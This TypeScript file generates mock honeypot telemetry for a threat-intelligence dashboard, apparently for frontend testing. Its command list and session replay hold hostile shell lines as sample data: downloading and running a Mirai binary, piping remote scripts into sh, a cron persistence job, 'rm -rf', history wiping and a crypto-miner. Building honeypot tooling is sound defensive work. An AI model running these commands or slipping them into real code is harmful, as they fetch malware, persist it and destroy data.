import type {
  CredentialPair,
  GeoInfo,
  HoneypotEvent,
  HoneypotEventType,
  SensorType,
  SessionReplay,
  StixBundle,
  ThreatActor,
} from '@/types/api';

/**
 * Deterministic-ish fake data generator for MSW.
 * Produces varied, realistic-looking honeypot telemetry.
 */

let counter = 0;

function pick<T>(arr: readonly T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const GEOS: readonly GeoInfo[] = [
  {
    country: 'CN',
    countryName: 'Chiny',
    city: 'Szanghaj',
    lat: 31.23,
    lon: 121.47,
    asn: 4134,
    org: 'Chinanet',
  },
  {
    country: 'RU',
    countryName: 'Rosja',
    city: 'Moskwa',
    lat: 55.75,
    lon: 37.62,
    asn: 12389,
    org: 'Rostelecom',
  },
  {
    country: 'US',
    countryName: 'Stany Zjednoczone',
    city: 'Ashburn',
    lat: 39.04,
    lon: -77.49,
    asn: 14618,
    org: 'Amazon AWS',
  },
  {
    country: 'BR',
    countryName: 'Brazylia',
    city: 'São Paulo',
    lat: -23.55,
    lon: -46.63,
    asn: 28573,
    org: 'Claro S.A.',
  },
  {
    country: 'IN',
    countryName: 'Indie',
    city: 'Mumbaj',
    lat: 19.08,
    lon: 72.88,
    asn: 9829,
    org: 'BSNL',
  },
  {
    country: 'VN',
    countryName: 'Wietnam',
    city: 'Hanoi',
    lat: 21.03,
    lon: 105.85,
    asn: 45899,
    org: 'VNPT',
  },
  {
    country: 'NL',
    countryName: 'Holandia',
    city: 'Amsterdam',
    lat: 52.37,
    lon: 4.9,
    asn: 60781,
    org: 'LeaseWeb',
  },
  {
    country: 'KP',
    countryName: 'Korea Północna',
    city: 'Pjongjang',
    lat: 39.03,
    lon: 125.75,
    asn: 131279,
    org: 'Ryugyong-dong',
  },
  {
    country: 'IR',
    countryName: 'Iran',
    city: 'Teheran',
    lat: 35.69,
    lon: 51.39,
    asn: 197207,
    org: 'MCCI',
  },
  {
    country: 'DE',
    countryName: 'Niemcy',
    city: 'Frankfurt',
    lat: 50.11,
    lon: 8.68,
    asn: 24940,
    org: 'Hetzner Online',
  },
];

const CREDENTIALS: readonly CredentialPair[] = [
  { username: 'root', password: '123456' },
  { username: 'admin', password: 'admin' },
  { username: 'root', password: 'root' },
  { username: 'admin', password: 'password' },
  { username: 'ubuntu', password: 'ubuntu' },
  { username: 'pi', password: 'raspberry' },
  { username: 'root', password: 'toor' },
  { username: 'oracle', password: 'oracle123' },
  { username: 'test', password: 'test' },
  { username: 'guest', password: 'guest' },
  { username: 'root', password: 'qwerty123' },
  { username: 'administrator', password: 'P@ssw0rd' },
];

const COMMANDS: readonly string[] = [
  'wget http://185.224.128.43/bins/mirai.x86 -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x',
  'uname -a',
  'cat /proc/cpuinfo | grep model | wc -l',
  'curl -s http://45.95.147.236/sh | sh',
  'echo -e "\\x6F\\x6B" && cd /tmp && rm -rf *',
  'ps aux | grep -v grep | grep miner',
  'crontab -l; echo "*/5 * * * * curl -fsSL http://193.32.162.71/c.sh | sh" | crontab -',
  'cat /etc/passwd',
  'history -c && rm -f ~/.bash_history',
  'nproc && free -m && df -h',
  './xmrig -o pool.minexmr.com:4444 -u 44AFFq5kSiGBoZ...',
  'ssh-keygen -t rsa -f /root/.ssh/id_rsa -q -N ""',
];

const HTTP_PATHS: readonly { method: string; path: string }[] = [
  { method: 'GET', path: '/.env' },
  { method: 'GET', path: '/wp-login.php' },
  { method: 'POST', path: '/boaform/admin/formLogin' },
  { method: 'GET', path: '/phpMyAdmin/scripts/setup.php' },
  { method: 'GET', path: '/actuator/health' },
  { method: 'POST', path: '/cgi-bin/luci/;stok=/locale' },
  { method: 'GET', path: '/owa/auth/logon.aspx' },
  { method: 'GET', path: '/admin/config.php' },
  { method: 'POST', path: '/api/jsonws/invoke' },
  { method: 'GET', path: '/solr/admin/info/system' },
];

const USER_AGENTS: readonly string[] = [
  'Mozilla/5.0 zgrab/0.x',
  'python-requests/2.31.0',
  'Mozilla/5.0 (compatible; CensysInspect/1.1)',
  'curl/8.4.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'masscan/1.3',
];

const SENSOR_IDS: Record<SensorType, readonly string[]> = {
  ssh: ['hp-ssh-weu-01', 'hp-ssh-neu-02', 'hp-ssh-eus-03'],
  web: ['hp-web-weu-01', 'hp-web-sea-02'],
  rdp: ['hp-rdp-weu-01', 'hp-rdp-eus-02'],
};

const KILL_CHAIN_PHASES = [
  'reconnaissance',
  'weaponization',
  'delivery',
  'exploitation',
  'installation',
  'command-and-control',
  'actions-on-objectives',
] as const;
const CATEGORIES = [
  'bruteforce',
  'botnet',
  'cryptomining',
  'scanning',
  'webshell',
  'ransomware-prep',
] as const;
const SOPHISTICATION = ['minimal', 'intermediate', 'advanced'] as const;
const INTENTS = ['opportunistic', 'targeted', 'automated'] as const;
const TI_SOURCES = ['AbuseIPDB', 'GreyNoise', 'AlienVault OTX', 'Spamhaus', 'FireHOL'] as const;
const ACTOR_IDS = [
  'actor-honeybadger',
  'actor-mirai-herd',
  'actor-cobalt-wasp',
  'actor-silent-drone',
] as const;

export function randomIp(): string {
  return `${randInt(1, 223)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

export function generateEvent(overrides?: Partial<HoneypotEvent>): HoneypotEvent {
  counter += 1;
  const sensorType: SensorType = pick(['ssh', 'ssh', 'ssh', 'web', 'web', 'rdp']);
  const eventTypeBySensor: Record<SensorType, readonly HoneypotEventType[]> = {
    ssh: ['login.failed', 'login.failed', 'login.failed', 'login.success', 'command', 'connect'],
    web: ['http.request', 'http.request', 'connect'],
    rdp: ['login.failed', 'login.failed', 'connect'],
  };
  const eventType = pick(eventTypeBySensor[sensorType]);
  const geo = pick(GEOS);
  const knownMalicious = Math.random() < 0.55;

  const event: HoneypotEvent = {
    id: `evt-${Date.now()}-${counter.toString(36)}`,
    attackerIp: randomIp(),
    sensorId: pick(SENSOR_IDS[sensorType]),
    sensorType,
    timestamp: new Date(Date.now() - randInt(0, 3_600_000)).toISOString(),
    eventType,
    sessionId: eventType === 'connect' ? undefined : `sess-${randInt(1000, 9999)}`,
    geo,
    threatIntel: {
      knownMalicious,
      sources: knownMalicious ? [pick(TI_SOURCES), pick(TI_SOURCES)] : [],
      score: knownMalicious ? randInt(60, 100) : randInt(0, 40),
    },
    classification: {
      killChainPhase: pick(KILL_CHAIN_PHASES),
      category: pick(CATEGORIES),
      sophistication: pick(SOPHISTICATION),
      intent: pick(INTENTS),
      actorId: Math.random() < 0.3 ? pick(ACTOR_IDS) : undefined,
    },
  };

  if (eventType === 'login.failed' || eventType === 'login.success') {
    event.credentials = pick(CREDENTIALS);
  }
  if (eventType === 'command') {
    event.command = pick(COMMANDS);
    if (event.command.includes('wget') || event.command.includes('curl')) {
      event.downloadHash = Array.from(
        { length: 64 },
        () => '0123456789abcdef'[randInt(0, 15)],
      ).join('');
    }
    event.ttyRef = `tty/${event.sessionId}.cast`;
  }
  if (eventType === 'http.request') {
    const req = pick(HTTP_PATHS);
    event.http = { ...req, userAgent: pick(USER_AGENTS) };
  }
  event.rawRef = `raw/${event.id}.json`;

  return { ...event, ...overrides };
}

export function generateFeed(take = 50): HoneypotEvent[] {
  return Array.from({ length: take }, () => generateEvent()).sort((a, b) =>
    b.timestamp.localeCompare(a.timestamp),
  );
}

export const MOCK_ACTORS: ThreatActor[] = [
  {
    id: 'actor-honeybadger',
    name: 'HoneyBadger Collective',
    firstSeen: '2026-01-12T08:11:00Z',
    lastSeen: new Date().toISOString(),
    eventCount: 14_203,
    knownIps: ['185.224.128.43', '45.95.147.236', '193.32.162.71'],
    countries: ['RU', 'NL'],
    sophistication: 'advanced',
    intent: 'targeted',
    severity: 'critical',
    description:
      'Grupa prowadząca ukierunkowane ataki brute-force na sensory SSH, z własną infrastrukturą C2.',
  },
  {
    id: 'actor-mirai-herd',
    name: 'Mirai Herd',
    firstSeen: '2026-02-03T14:40:00Z',
    lastSeen: new Date().toISOString(),
    eventCount: 88_911,
    knownIps: ['117.50.22.8', '103.149.26.77'],
    countries: ['CN', 'VN', 'IN'],
    sophistication: 'minimal',
    intent: 'automated',
    severity: 'high',
    description:
      'Botnet typu Mirai skanujący telnet/SSH i pobierający binaria na zainfekowane urządzenia IoT.',
  },
  {
    id: 'actor-cobalt-wasp',
    name: 'Cobalt Wasp',
    firstSeen: '2026-03-21T19:05:00Z',
    lastSeen: new Date().toISOString(),
    eventCount: 3_127,
    knownIps: ['91.240.118.14'],
    countries: ['IR'],
    sophistication: 'intermediate',
    intent: 'targeted',
    severity: 'medium',
    description:
      'Aktor wykorzystujący znane podatności aplikacji webowych (wystawione panele administracyjne).',
  },
  {
    id: 'actor-silent-drone',
    name: 'Silent Drone',
    firstSeen: '2026-04-02T02:30:00Z',
    lastSeen: new Date().toISOString(),
    eventCount: 642,
    knownIps: ['8.219.44.102'],
    countries: ['US'],
    sophistication: 'minimal',
    intent: 'opportunistic',
    severity: 'low',
    description: 'Masowe, niskopoziomowe skanowanie portów bez prób eksploitacji.',
  },
];

export function generateSessionReplay(sessionId: string): SessionReplay {
  const frames = [
    {
      offsetMs: 0,
      type: 'o' as const,
      data: 'Welcome to Ubuntu 22.04.3 LTS\r\nroot@web-prod-01:~# ',
    },
    { offsetMs: 1200, type: 'i' as const, data: 'uname -a\r' },
    {
      offsetMs: 1350,
      type: 'o' as const,
      data: 'Linux web-prod-01 5.15.0-91-generic x86_64 GNU/Linux\r\nroot@web-prod-01:~# ',
    },
    { offsetMs: 4100, type: 'i' as const, data: 'wget http://185.224.128.43/bins/mirai.x86\r' },
    {
      offsetMs: 4900,
      type: 'o' as const,
      data: 'Connecting to 185.224.128.43... connected.\r\nmirai.x86 saved [112640/112640]\r\nroot@web-prod-01:~# ',
    },
    { offsetMs: 7300, type: 'i' as const, data: 'chmod +x mirai.x86 && ./mirai.x86\r' },
    { offsetMs: 7800, type: 'o' as const, data: 'listening tun0\r\n' },
  ];
  return {
    sessionId,
    attackerIp: randomIp(),
    sensorId: 'hp-ssh-weu-01',
    startedAt: new Date(Date.now() - 600_000).toISOString(),
    durationMs: 8000,
    frames,
  };
}

export function generateStixBundle(): StixBundle {
  const now = new Date().toISOString();
  return {
    type: 'bundle',
    id: 'bundle--7f9aa1f4-31c2-4b9e-9d2e-0f3a4b5c6d7e',
    objects: [
      {
        type: 'indicator',
        id: 'indicator--a1b2c3d4-0001-4aaa-bbbb-000000000001',
        created: now,
        modified: now,
        pattern: "[ipv4-addr:value = '185.224.128.43']",
        labels: ['malicious-activity'],
        name: 'Mirai C2 distribution host',
      },
      {
        type: 'indicator',
        id: 'indicator--a1b2c3d4-0002-4aaa-bbbb-000000000002',
        created: now,
        modified: now,
        pattern:
          "[file:hashes.'SHA-256' = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f']",
        labels: ['malicious-activity'],
        name: 'Mirai x86 dropper',
      },
      {
        type: 'threat-actor',
        id: 'threat-actor--b2c3d4e5-0003-4bbb-cccc-000000000003',
        created: now,
        modified: now,
        labels: ['crime-syndicate'],
        name: 'HoneyBadger Collective',
      },
    ],
  };
}
